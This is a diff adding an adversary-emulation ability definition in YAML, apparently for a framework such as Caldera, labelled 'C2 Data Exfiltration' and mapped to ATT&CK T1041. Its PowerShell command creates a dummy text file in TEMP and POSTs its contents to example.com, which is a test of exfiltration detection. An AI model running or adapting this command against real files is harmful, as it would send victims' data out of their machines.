@@ -1,0 +1,23 @@
+---
+- id: 72784d12700b219ec134aa42cec5603e
+  name: C2 Data Exfiltration
+  description: 'Exfiltrates a file present on the victim machine to the C2 server.
+
+    '
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: Exfiltration Over C2 Channel
+  platforms:
+    windows:
+      psh:
+        command: if(-not (Test-Path $env:TEMP\LineNumbers.txt)){ ;   1..100 | ForEach-Object
+          { Add-Content -Path $env:TEMP\LineNumbers.txt -Value "This is line $_."
+          }; }; [System.Net.ServicePointManager]::Expect100Continue = $false; $filecontent
+          = Get-Content -Path $env:TEMP\LineNumbers.txt; Invoke-WebRequest -Uri example.com
+          -Method POST -Body $filecontent -DisableKeepAlive
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
